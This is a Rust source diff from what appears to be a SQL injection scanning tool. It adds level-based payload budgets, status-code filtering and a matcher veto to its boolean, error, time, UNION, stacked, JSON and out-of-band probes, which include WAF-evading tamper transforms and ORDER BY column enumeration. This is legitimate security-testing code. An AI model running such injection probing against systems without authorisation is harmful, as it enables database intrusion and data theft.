@@ -1286,7 +1670,8 @@ fn build_injection_spec_with_raw(
             RequestSpec::new(method, url)
         }
         ParameterLocation::Body => {
-            let (method, body_str, mut headers) = inject_body_param(raw, param, payload, opts.hpp);
+            let (method, body_str, mut headers) =
+                inject_body_param(raw, param, payload, opts.hpp, &safe, skip);
             if should_apply_chunked(true, opts.chunked) {
                 headers.remove(http::header::CONTENT_LENGTH);
                 headers.insert(
@@ -1346,7 +1731,7 @@ fn build_injection_spec_with_raw(
             let mut found = false;
             for (ck, cv) in &mut cookies {
                 if ck == &param.name {
-                    *cv = payload.to_owned();
+                    payload.clone_into(cv);
                     found = true;
                 }
             }
@@ -1381,20 +1766,23 @@ async fn fetch_for_payload(
     marker_set: &MarkerSet,
     raw: Option<&RawRequest>,
     opts: ProbeOpts,
-) -> (String, f64) {
-    let spec =
-        build_injection_spec_with_raw(target, target_str, param, payload, marker_set, raw, opts);
+    popts: &PayloadOpts,
+) -> (String, f64, u16) {
+    let spec = build_injection_spec_with_raw(
+        target, target_str, param, payload, marker_set, raw, opts, popts,
+    );
     let start = Instant::now();
     let resp = client.send_with_retry(spec, cancel).await;
     let elapsed = start.elapsed().as_secs_f64() * 1000.0;
     state.write().await.increment_requests();
     match resp {
         Ok(r) => {
+            let status = r.status().as_u16();
             #[allow(clippy::unwrap_used)]
             let body = r.text().await.unwrap_or_default();
-            (body, elapsed)
+            (body, elapsed, status)
         }
-        Err(_) => (String::new(), elapsed),
+        Err(_) => (String::new(), elapsed, 0),
     }
 }
 
@@ -1445,6 +1833,8 @@ async fn fetch_body_and_time_spec(
 }
 
 #[allow(clippy::too_many_arguments)]
+#[allow(clippy::similar_names)]
+#[allow(clippy::too_many_lines)]
 async fn test_boolean_bounded(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -1457,12 +1847,19 @@ async fn test_boolean_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
     let payloads = boolean_payloads_for(None);
     let detector = BooleanDetector::new();
-    let baseline_body = baseline.representative_body_str();
+    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
     let tamper_sets = tamper_transformation_sets(tampers);
-    for p in payloads.iter().take(2) {
+    for p in payloads
+        .iter()
+        .take(payload_budget(level, 2, payloads.len()))
+    {
         if cancel.is_cancelled() {
             break;
         }
@@ -1471,24 +1868,33 @@ async fn test_boolean_bounded(
             if cancel.is_cancelled() {
                 break;
             }
-            let true_payload = apply_tampers(&p.true_payload, trans);
-            let false_payload = apply_tampers(&p.false_payload, trans);
+            let true_payload = build_final_payload(&p.true_payload, trans, popts);
+            let false_payload = build_final_payload(&p.false_payload, trans, popts);
             // Skip duplicate variants already tried for this base payload
             // (dedupe via string equality already handled by transformation sets, but
             // randomcase produces different strings per call — we still try each set once)
             let tamper_label = if trans.is_empty() {
                 "none".to_owned()
             } else {
-                trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                trans
+                    .iter()
+                    .map(super::super::techniques::tamper::Tamper::name)
+                    .collect::<Vec<_>>()
+                    .join(",")
             };
             // 3 trials confirmation
-            let mut trials: Vec<(bool, f64)> = Vec::with_capacity(3);
+            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
             let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
+            let mut last_true = String::new();
+            let mut last_false = String::new();
+            let mut last_t_status: u16 = 0;
+            #[allow(clippy::similar_names)]
+            let mut last_f_status: u16 = 0;
             for _ in 0..3 {
                 if cancel.is_cancelled() {
                     break;
                 }
-                let (true_body, true_ms) = fetch_for_payload(
+                let (true_raw, true_ms, true_status) = fetch_for_payload(
                     client,
                     state,
                     cancel,
@@ -1499,9 +1905,11 @@ async fn test_boolean_bounded(
                     marker_set,
                     raw,
                     opts,
+                    popts,
                 )
                 .await;
-                let (false_body, false_ms) = fetch_for_payload(
+                let true_body = matcher.pre_process(&true_raw);
+                let (false_raw, false_ms, false_status) = fetch_for_payload(
                     client,
                     state,
                     cancel,
@@ -1512,8 +1920,22 @@ async fn test_boolean_bounded(
                     marker_set,
                     raw,
                     opts,
+                    popts,
                 )
                 .await;
+                let false_body = matcher.pre_process(&false_raw);
+                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
+                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
+                    trials.push(crate::detection::confirmation::Trial {
+                        true_conf: 0.0,
+                        false_conf: 1.0,
+                    });
+                    last_true = true_body;
+                    last_false = false_body;
+                    last_t_status = true_status;
+                    last_f_status = false_status;
+                    continue;
+                }
                 let res = detector.evaluate(
                     &baseline_body,
                     &true_body,
@@ -1522,22 +1944,38 @@ async fn test_boolean_bounded(
                     true_ms,
                     false_ms,
                 );
-                trials.push((res.is_vulnerable, res.confidence));
+                trials.push(crate::detection::confirmation::Trial {
+                    true_conf: res.true_similarity,
+                    false_conf: res.false_similarity,
+                });
                 last_res = Some(res);
+                last_true = true_body;
+                last_false = false_body;
+                last_t_status = true_status;
+                last_f_status = false_status;
             }
-            let conf = confirmation::confirm(&trials);
+            let conf = crate::detection::confirmation::confirm(&trials);
             if conf.confirmed {
+                // Matcher veto gate: `Some(false)` rejects the candidate,
+                // `None` abstains and lets the detector decide.
+                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
+                    == Some(false)
+                {
+                    continue;
+                }
                 let res = last_res.unwrap_or_else(|| {
                     detector.evaluate(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                 });
                 let evidence = format!(
-                    "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}",
+                    "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}",
                     res.true_similarity,
                     res.false_similarity,
                     conf.trials,
                     conf.false_positive_prob,
                     tamper_label,
-                    opts.evidence_suffix()
+                    opts.evidence_suffix(),
+                    popts.evidence_suffix(),
+                    matcher.evidence_suffix()
                 );
                 let mut finding = Finding::new(
                     target.as_str(),
@@ -1570,11 +2008,18 @@ async fn test_error_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
     let detector = ErrorDetector::new();
     let payloads = crate::techniques::error::payloads::error_payloads_for(None);
     let tamper_sets = tamper_transformation_sets(tampers);
-    for p in payloads.iter().take(2) {
+    for p in payloads
+        .iter()
+        .take(payload_budget(level, 2, payloads.len()))
+    {
         if cancel.is_cancelled() {
             break;
         }
@@ -1583,17 +2028,31 @@ async fn test_error_bounded(
             if cancel.is_cancelled() {
                 break;
             }
-            let tampered = apply_tampers(&p.payload, trans);
-            let (body, _ms) = fetch_for_payload(
+            let tampered = build_final_payload(&p.payload, trans, popts);
+            let (raw_body, _ms, status) = fetch_for_payload(
                 client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
+                popts,
             )
             .await;
+            let body = matcher.pre_process(&raw_body);
+            // `--ignore-code`: an ignored status is skipped, never a finding.
+            if is_ignored(status, ignore_codes) {
+                continue;
+            }
             let r = detector.evaluate(&body);
             if r.is_vulnerable {
+                // Matcher veto gate: `Some(false)` rejects the candidate.
+                if matcher.matches(&body, status) == Some(false) {
+                    continue;
+                }
                 let tamper_label = if trans.is_empty() {
                     "none".to_owned()
                 } else {
-                    trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                    trans
+                        .iter()
+                        .map(super::super::techniques::tamper::Tamper::name)
+                        .collect::<Vec<_>>()
+                        .join(",")
                 };
                 let mut finding = Finding::new(
                     target.as_str(),
@@ -1601,10 +2060,12 @@ async fn test_error_bounded(
                     TechniqueKind::Error,
                     r.confidence,
                     format!(
-                        "error pattern {:?} tamper={}{}",
+                        "error pattern {:?} tamper={}{}{}{}",
                         r.matched_pattern,
                         tamper_label,
-                        opts.evidence_suffix()
+                        opts.evidence_suffix(),
+                        popts.evidence_suffix(),
+                        matcher.evidence_suffix()
                     ),
                 );
                 finding.dbms = Some(p.dbms.clone());
@@ -1632,16 +2093,22 @@ async fn test_time_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
+    // Single-payload technique: `--level` carries no extra budget here.
+    let _ = level;
     let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
-    let base = time_payload_for(None, 3.0);
+    let base = time_payload_for(None, 3);
     let sets = tamper_transformation_sets(tampers);
     for trans in &sets {
         if cancel.is_cancelled() {
             break;
         }
-        let payload_str = apply_tampers(&base.payload, trans);
-        let (_body, ms) = fetch_for_payload(
+        let payload_str = build_final_payload(&base.payload, trans, popts);
+        let (raw_body, ms, status) = fetch_for_payload(
             client,
             state,
             cancel,
@@ -1652,14 +2119,30 @@ async fn test_time_bounded(
             marker_set,
             raw,
             opts,
+            popts,
         )
         .await;
-        let r = detector.evaluate(ms, base.sleep_secs);
+        // `--ignore-code`: an ignored status is skipped, never a finding.
+        if is_ignored(status, ignore_codes) {
+            continue;
+        }
+        let body = matcher.pre_process(&raw_body);
+        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
+        #[allow(clippy::cast_precision_loss)]
+        let r = detector.evaluate(ms, base.sleep_secs as f64);
         if r.is_vulnerable {
+            // Matcher veto gate: `Some(false)` rejects the candidate.
+            if matcher.matches(&body, status) == Some(false) {
+                continue;
+            }
             let tamper_label = if trans.is_empty() {
                 "none".to_owned()
             } else {
-                trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                trans
+                    .iter()
+                    .map(super::super::techniques::tamper::Tamper::name)
+                    .collect::<Vec<_>>()
+                    .join(",")
             };
             let finding = Finding::new(
                 target.as_str(),
@@ -1667,11 +2150,13 @@ async fn test_time_bounded(
                 TechniqueKind::Time,
                 r.confidence,
                 format!(
-                    "time delay {:.0}ms > threshold {:.0}ms tamper={}{}",
+                    "time delay {:.0}ms > threshold {:.0}ms tamper={}{}{}{}",
                     r.measured_ms,
                     detector.threshold(),
                     tamper_label,
-                    opts.evidence_suffix()
+                    opts.evidence_suffix(),
+                    popts.evidence_suffix(),
+                    matcher.evidence_suffix()
                 ),
             );
             state.write().await.push_finding(finding);
@@ -1697,10 +2182,19 @@ async fn enumerate_columns_via_order_by(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) -> Option<usize> {
-    const MAX_ORDER_BY_COLS: usize = 10;
+    // `--level` widens ORDER BY enumeration: L1=10 (historical), L2=15, L3+=20.
+    let max_order_by_cols: usize = match level {
+        1 => 10,
+        2 => 15,
+        _ => 20,
+    };
     let sets = tamper_transformation_sets(tampers);
-    for i in 1..=MAX_ORDER_BY_COLS {
+    for i in 1..=max_order_by_cols {
         if cancel.is_cancelled() {
             return None;
         }
@@ -1710,11 +2204,17 @@ async fn enumerate_columns_via_order_by(
             if cancel.is_cancelled() {
                 return None;
             }
-            let payload = apply_tampers(&base, trans);
-            let (body, _ms) = fetch_for_payload(
+            let payload = build_final_payload(&base, trans, popts);
+            let (raw_body, _ms, status) = fetch_for_payload(
                 client, state, cancel, target, target_str, param, &payload, marker_set, raw, opts,
+                popts,
             )
             .await;
+            // `--ignore-code`: an ignored response never triggers an ORDER BY error.
+            if is_ignored(status, ignore_codes) {
+                continue;
+            }
+            let body = matcher.pre_process(&raw_body);
             if detector.evaluate_order_by(&body) {
                 triggered = true;
                 break;
@@ -1730,11 +2230,12 @@ async fn enumerate_columns_via_order_by(
             return Some(inferred);
         }
     }
-    info!("ORDER BY enumeration found no error up to {MAX_ORDER_BY_COLS} — undetermined");
+    info!("ORDER BY enumeration found no error up to {max_order_by_cols} — undetermined");
     None
 }
 
 #[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_lines)]
 async fn test_union_bounded(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -1747,9 +2248,13 @@ async fn test_union_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
     let detector = UnionDetector::new();
-    let baseline_body = baseline.representative_body_str();
+    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
     let tamper_sets = tamper_transformation_sets(tampers);
 
     // Phase 0 — ORDER BY enumeration to reduce false positives.
@@ -1757,7 +2262,21 @@ async fn test_union_bounded(
     // still fall back to the heuristic list (excluding the already-tried `n`) to
     // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
     let inferred = enumerate_columns_via_order_by(
-        client, state, cancel, target, target_str, param, marker_set, &detector, raw, tampers, opts,
+        client,
+        state,
+        cancel,
+        target,
+        target_str,
+        param,
+        marker_set,
+        &detector,
+        raw,
+        tampers,
+        opts,
+        popts,
+        matcher,
+        level,
+        ignore_codes,
     )
     .await;
 
@@ -1779,7 +2298,10 @@ async fn test_union_bounded(
         }
         let cols = *cols;
         let payloads = union_payloads_for(None, cols);
-        for p in payloads.iter().take(1) {
+        for p in payloads
+            .iter()
+            .take(payload_budget(level, 1, payloads.len()))
+        {
             if cancel.is_cancelled() {
                 return;
             }
@@ -1787,18 +2309,32 @@ async fn test_union_bounded(
                 if cancel.is_cancelled() {
                     return;
                 }
-                let tampered = apply_tampers(&p.payload, trans);
-                let (body, ms) = fetch_for_payload(
+                let tampered = build_final_payload(&p.payload, trans, popts);
+                let (raw_body, ms, status) = fetch_for_payload(
                     client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
-                    opts,
+                    opts, popts,
                 )
                 .await;
-                let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
+                // `--ignore-code`: an ignored status is skipped, never a finding.
+                if is_ignored(status, ignore_codes) {
+                    continue;
+                }
+                let body = matcher.pre_process(&raw_body);
+                let r =
+                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                 if r.is_vulnerable {
+                    // Matcher veto gate: `Some(false)` rejects the candidate.
+                    if matcher.matches(&body, status) == Some(false) {
+                        continue;
+                    }
                     let tamper_label = if trans.is_empty() {
                         "none".to_owned()
                     } else {
-                        trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                        trans
+                            .iter()
+                            .map(super::super::techniques::tamper::Tamper::name)
+                            .collect::<Vec<_>>()
+                            .join(",")
                     };
                     let mut finding = Finding::new(
                         target.as_str(),
@@ -1806,12 +2342,14 @@ async fn test_union_bounded(
                         TechniqueKind::Union,
                         r.confidence,
                         format!(
-                            "union columns={:?} payload={} order_by_inferred={:?} tamper={}{}",
+                            "union columns={:?} payload={} order_by_inferred={:?} tamper={}{}{}{}",
                             r.columns,
                             tampered,
                             inferred,
                             tamper_label,
-                            opts.evidence_suffix()
+                            opts.evidence_suffix(),
+                            popts.evidence_suffix(),
+                            matcher.evidence_suffix()
                         ),
                     );
                     finding.dbms = Some(p.dbms.clone());
@@ -1828,7 +2366,10 @@ async fn test_union_bounded(
             break;
         }
         let payloads = union_payloads_for(None, cols);
-        for p in payloads.iter().take(1) {
+        for p in payloads
+            .iter()
+            .take(payload_budget(level, 1, payloads.len()))
+        {
             if cancel.is_cancelled() {
                 break;
             }
@@ -1836,18 +2377,32 @@ async fn test_union_bounded(
                 if cancel.is_cancelled() {
                     break;
                 }
-                let tampered = apply_tampers(&p.payload, trans);
-                let (body, ms) = fetch_for_payload(
+                let tampered = build_final_payload(&p.payload, trans, popts);
+                let (raw_body, ms, status) = fetch_for_payload(
                     client, state, cancel, target, target_str, param, &tampered, marker_set, raw,
-                    opts,
+                    opts, popts,
                 )
                 .await;
-                let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
+                // `--ignore-code`: an ignored status is skipped, never a finding.
+                if is_ignored(status, ignore_codes) {
+                    continue;
+                }
+                let body = matcher.pre_process(&raw_body);
+                let r =
+                    detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
                 if r.is_vulnerable {
+                    // Matcher veto gate: `Some(false)` rejects the candidate.
+                    if matcher.matches(&body, status) == Some(false) {
+                        continue;
+                    }
                     let tamper_label = if trans.is_empty() {
                         "none".to_owned()
                     } else {
-                        trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                        trans
+                            .iter()
+                            .map(super::super::techniques::tamper::Tamper::name)
+                            .collect::<Vec<_>>()
+                            .join(",")
                     };
                     let mut finding = Finding::new(
                         target.as_str(),
@@ -1855,12 +2410,14 @@ async fn test_union_bounded(
                         TechniqueKind::Union,
                         r.confidence,
                         format!(
-                            "union columns={:?} payload={} order_by_inferred={:?} (fallback) tamper={}{}",
+                            "union columns={:?} payload={} order_by_inferred={:?} (fallback) tamper={}{}{}{}",
                             r.columns,
                             tampered,
                             inferred,
                             tamper_label,
-                            opts.evidence_suffix()
+                            opts.evidence_suffix(),
+                            popts.evidence_suffix(),
+                            matcher.evidence_suffix()
                         ),
                     );
                     finding.dbms = Some(p.dbms.clone());
@@ -1885,12 +2442,19 @@ async fn test_stacked_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
     let detector = StackedDetector::new();
-    let baseline_body = baseline.representative_body_str();
+    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
     let payloads = stacked_payloads_for(None);
     let tamper_sets = tamper_transformation_sets(tampers);
-    for p in payloads.iter().take(2) {
+    for p in payloads
+        .iter()
+        .take(payload_budget(level, 2, payloads.len()))
+    {
         if cancel.is_cancelled() {
             break;
         }
@@ -1899,17 +2463,31 @@ async fn test_stacked_bounded(
             if cancel.is_cancelled() {
                 break;
             }
-            let tampered = apply_tampers(&p.payload, trans);
-            let (body, ms) = fetch_for_payload(
+            let tampered = build_final_payload(&p.payload, trans, popts);
+            let (raw_body, ms, status) = fetch_for_payload(
                 client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
+                popts,
             )
             .await;
+            let body = matcher.pre_process(&raw_body);
+            // `--ignore-code`: an ignored status is skipped, never a finding.
+            if is_ignored(status, ignore_codes) {
+                continue;
+            }
             let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p);
             if r.is_vulnerable {
+                // Matcher veto gate: `Some(false)` rejects the candidate.
+                if matcher.matches(&body, status) == Some(false) {
+                    continue;
+                }
                 let tamper_label = if trans.is_empty() {
                     "none".to_owned()
                 } else {
-                    trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                    trans
+                        .iter()
+                        .map(super::super::techniques::tamper::Tamper::name)
+                        .collect::<Vec<_>>()
+                        .join(",")
                 };
                 let mut finding = Finding::new(
                     target.as_str(),
@@ -1917,11 +2495,13 @@ async fn test_stacked_bounded(
                     TechniqueKind::Stacked,
                     r.confidence,
                     format!(
-                        "stacked dbms={} marker={} tamper={}{}",
+                        "stacked dbms={} marker={} tamper={}{}{}{}",
                         r.dbms.as_deref().unwrap_or("?"),
                         p.marker,
                         tamper_label,
-                        opts.evidence_suffix()
+                        opts.evidence_suffix(),
+                        popts.evidence_suffix(),
+                        matcher.evidence_suffix()
                     ),
                 );
                 finding.dbms = r.dbms.clone();
@@ -1940,6 +2520,8 @@ async fn test_stacked_bounded(
 /// `JSON_VALUE` pairs (3-trial confirmation) plus a single-shot error probe
 /// (`__bad__` sentinel document → per-DBMS JSON error text).
 #[allow(clippy::too_many_arguments)]
+#[allow(clippy::similar_names)]
+#[allow(clippy::too_many_lines)]
 async fn test_json_bounded(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -1952,12 +2534,19 @@ async fn test_json_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
 ) {
     let detector = JsonDetector::new();
     let payloads = json_payloads_for(None);
-    let baseline_body = baseline.representative_body_str();
+    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
     let tamper_sets = tamper_transformation_sets(tampers);
-    for p in payloads.iter().take(2) {
+    for p in payloads
+        .iter()
+        .take(payload_budget(level, 2, payloads.len()))
+    {
         if cancel.is_cancelled() {
             break;
         }
@@ -1966,22 +2555,31 @@ async fn test_json_bounded(
             if cancel.is_cancelled() {
                 break;
             }
-            let true_payload = apply_tampers(&p.true_payload, trans);
-            let false_payload = apply_tampers(&p.false_payload, trans);
-            let error_probe = apply_tampers(&p.error_payload, trans);
+            let true_payload = build_final_payload(&p.true_payload, trans, popts);
+            let false_payload = build_final_payload(&p.false_payload, trans, popts);
+            let error_probe = build_final_payload(&p.error_payload, trans, popts);
             let tamper_label = if trans.is_empty() {
                 "none".to_owned()
             } else {
-                trans.iter().map(|t| t.name()).collect::<Vec<_>>().join(",")
+                trans
+                    .iter()
+                    .map(super::super::techniques::tamper::Tamper::name)
+                    .collect::<Vec<_>>()
+                    .join(",")
             };
             // Channel 1 — boolean differential with confirmation (3 trials)
-            let mut trials: Vec<(bool, f64)> = Vec::with_capacity(3);
+            let mut trials: Vec<crate::detection::confirmation::Trial> = Vec::with_capacity(3);
             let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
+            let mut last_true = String::new();
+            let mut last_false = String::new();
+            let mut last_t_status: u16 = 0;
+            #[allow(clippy::similar_names)]
+            let mut last_f_status: u16 = 0;
             for _ in 0..3 {
                 if cancel.is_cancelled() {
                     break;
                 }
-                let (true_body, true_ms) = fetch_for_payload(
+                let (true_raw, true_ms, true_status) = fetch_for_payload(
                     client,
                     state,
                     cancel,
@@ -1992,9 +2590,11 @@ async fn test_json_bounded(
                     marker_set,
                     raw,
                     opts,
+                    popts,
                 )
                 .await;
-                let (false_body, false_ms) = fetch_for_payload(
+                let true_body = matcher.pre_process(&true_raw);
+                let (false_raw, false_ms, false_status) = fetch_for_payload(
                     client,
                     state,
                     cancel,
@@ -2005,8 +2605,22 @@ async fn test_json_bounded(
                     marker_set,
                     raw,
                     opts,
+                    popts,
                 )
                 .await;
+                let false_body = matcher.pre_process(&false_raw);
+                // `--ignore-code`: an ignored status counts as a negative trial, never a finding.
+                if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
+                    trials.push(crate::detection::confirmation::Trial {
+                        true_conf: 0.0,
+                        false_conf: 1.0,
+                    });
+                    last_true = true_body;
+                    last_false = false_body;
+                    last_t_status = true_status;
+                    last_f_status = false_status;
+                    continue;
+                }
                 let res = detector.evaluate_boolean(
                     &baseline_body,
                     &true_body,
@@ -2015,11 +2629,24 @@ async fn test_json_bounded(
                     true_ms,
                     false_ms,
                 );
-                trials.push((res.is_vulnerable, res.confidence));
+                trials.push(crate::detection::confirmation::Trial {
+                    true_conf: res.true_similarity,
+                    false_conf: res.false_similarity,
+                });
                 last_res = Some(res);
+                last_true = true_body;
+                last_false = false_body;
+                last_t_status = true_status;
+                last_f_status = false_status;
             }
-            let conf = confirmation::confirm(&trials);
+            let conf = crate::detection::confirmation::confirm(&trials);
             if conf.confirmed {
+                // Matcher veto gate: `Some(false)` rejects the candidate.
+                if matcher.gate_boolean(&last_true, &last_false, last_t_status, last_f_status)
+                    == Some(false)
+                {
+                    continue;
+                }
                 let res = last_res.unwrap_or_else(|| {
                     detector.evaluate_boolean(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
                 });
@@ -2029,14 +2656,16 @@ async fn test_json_bounded(
                     TechniqueKind::Json,
                     conf.score,
                     format!(
-                        "json channel=boolean dbms={} true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}",
+                        "json channel=boolean dbms={} true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2} tamper={}{}{}{}",
                         p.dbms,
                         res.true_similarity,
                         res.false_similarity,
                         conf.trials,
                         conf.false_positive_prob,
                         tamper_label,
-                        opts.evidence_suffix()
+                        opts.evidence_suffix(),
+                        popts.evidence_suffix(),
+                        matcher.evidence_suffix()
                     ),
                 );
                 finding.dbms = Some(p.dbms.clone());
@@ -2045,7 +2674,7 @@ async fn test_json_bounded(
                 break;
             }
             // Channel 2 — single-shot JSON error probe
-            let (body, _ms) = fetch_for_payload(
+            let (raw_body, _ms, status) = fetch_for_payload(
                 client,
                 state,
                 cancel,
@@ -2056,20 +2685,32 @@ async fn test_json_bounded(
                 marker_set,
                 raw,
                 opts,
+                popts,
             )
             .await;
+            let body = matcher.pre_process(&raw_body);
+            // `--ignore-code`: an ignored status is skipped, never a finding.
+            if is_ignored(status, ignore_codes) {
+                continue;
+            }
             let r = detector.evaluate_error(&body);
             if r.is_vulnerable {
+                // Matcher veto gate: `Some(false)` rejects the candidate.
+                if matcher.matches(&body, status) == Some(false) {
+                    continue;
+                }
                 let mut finding = Finding::new(
                     target.as_str(),
                     param.key(),
                     TechniqueKind::Json,
                     r.confidence,
                     format!(
-                        "json channel=error pattern={:?} tamper={}{}",
+                        "json channel=error pattern={:?} tamper={}{}{}{}",
                         r.matched_pattern,
                         tamper_label,
-                        opts.evidence_suffix()
+                        opts.evidence_suffix(),
+                        popts.evidence_suffix(),
+                        matcher.evidence_suffix()
                     ),
                 );
                 finding.dbms = r.dbms.clone().or_else(|| Some(p.dbms.clone()));
@@ -2098,6 +2739,7 @@ async fn test_json_bounded(
 /// then poll (`HttpPollVerifier` or `NoopVerifier`). A finding
 /// (`TechniqueKind::Oob`, confidence 0.95) is pushed only on callback.
 #[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_lines)]
 async fn test_oob_bounded(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -2110,10 +2752,15 @@ async fn test_oob_bounded(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    level: u8,
+    ignore_codes: &[u16],
     oob_domain: Option<String>,
     oob_poll_url: Option<String>,
     oob_wait_secs: u64,
 ) {
+    use crate::techniques::oob::verifier::OobVerifier as _;
     let Some(domain) = oob_domain else {
         return;
     };
@@ -2123,7 +2770,7 @@ async fn test_oob_bounded(
     }
     let token = new_token();
     let detector = OobDetector::new(domain.clone());
-    let baseline_body = baseline.representative_body_str();
+    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
     let payloads = oob_payloads_for(None, &domain, &token);
     let tamper_sets = tamper_transformation_sets(tampers);
     let has_poll_url = oob_poll_url
@@ -2136,9 +2783,14 @@ async fn test_oob_bounded(
     // expected to match baseline.
     let mut last_body = baseline_body.clone();
     let mut last_ms = baseline.mean_ms;
+    let mut last_status: u16 = 0;
     let mut last_payload_idx = 0usize;
     let mut probes_sent = 0usize;
-    for (pi, p) in payloads.iter().take(3).enumerate() {
+    for (pi, p) in payloads
+        .iter()
+        .take(payload_budget(level, 3, payloads.len()))
+        .enumerate()
+    {
         if cancel.is_cancelled() {
             return;
         }
@@ -2146,14 +2798,28 @@ async fn test_oob_bounded(
             if cancel.is_cancelled() {
                 return;
             }
-            let tampered = apply_tampers(&p.payload, trans);
-            let (body, ms) = fetch_for_payload(
+            let tampered = build_final_payload(&p.payload, trans, popts);
+            let (raw_body, ms, status) = fetch_for_payload(
                 client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
+                popts,
             )
             .await;
             probes_sent += 1;
-            last_body = body;
+            // `--ignore-code`: an ignored probe response is discarded
+            // (kept baseline-neutral); the final gate below vetoes when the
+            // last probe was ignored — never a finding.
+            if is_ignored(status, ignore_codes) {
+                last_status = status;
+                if !has_poll_url {
+                    // Without confirmation infra one variant per payload is enough;
+                    // the operator checks the collaborator UI manually.
+                    break;
+                }
+                continue;
+            }
+            last_body = matcher.pre_process(&raw_body);
             last_ms = ms;
+            last_status = status;
             last_payload_idx = pi;
             if !has_poll_url {
                 // Without confirmation infra one variant per payload is enough;
@@ -2204,7 +2870,6 @@ async fn test_oob_bounded(
         if cancel.is_cancelled() {
             return;
         }
-        use crate::techniques::oob::verifier::OobVerifier as _;
         if poll_verifier.verify(&token).await {
             callback_seen = true;
             break;
@@ -2215,6 +2880,10 @@ async fn test_oob_bounded(
         }
     }
     let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
+    // `--ignore-code`: never confirm on an ignored final response.
+    if is_ignored(last_status, ignore_codes) {
+        return;
+    }
     let r = detector.evaluate_with_callback(
         &baseline_body,
         &last_body,
@@ -2224,19 +2893,25 @@ async fn test_oob_bounded(
         callback_seen,
     );
     if r.is_vulnerable {
+        // Matcher veto gate: `Some(false)` rejects the candidate.
+        if matcher.matches(&last_body, last_status) == Some(false) {
+            return;
+        }
         let mut finding = crate::session::state::Finding::new(
             target.as_str(),
             param.key(),
             crate::session::state::TechniqueKind::Oob,
             r.confidence,
             format!(
-                "oob channel={} dbms={} token={} fqdn={} probes={}{}",
+                "oob channel={} dbms={} token={} fqdn={} probes={}{}{}{}",
                 r.channel,
                 r.dbms.as_deref().unwrap_or("?"),
                 r.token,
                 p.fqdn,
                 probes_sent,
                 opts.evidence_suffix(),
+                popts.evidence_suffix(),
+                matcher.evidence_suffix(),
             ),
         );
         finding.dbms = r.dbms.clone();
